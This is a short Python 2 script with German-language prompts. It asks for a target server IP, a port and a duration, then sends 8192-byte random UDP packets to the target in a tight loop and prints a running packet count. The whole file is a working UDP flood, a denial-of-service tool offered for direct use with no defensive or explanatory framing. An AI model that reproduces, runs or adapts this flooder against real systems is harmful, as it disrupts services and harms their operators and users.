import socket
import time
import random


s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom (8192)

ip = raw_input ("Gebe die Server IP ein    :    ")
port = input ("Gebe den Port ein    :   ")
duration = input ("Wie lange soll es gehen ?    ")
timeout = time.time() + duration 
sent= 0 

while True:
	if time.time() > timeout:
		break
	else:
		pass
	s.sendto(bytes,(ip, port))
	sent = sent + 1 
	print "Sende %s Pakete an %s ueber den Port %s"%(sent, ip, port)
	











		
	
	

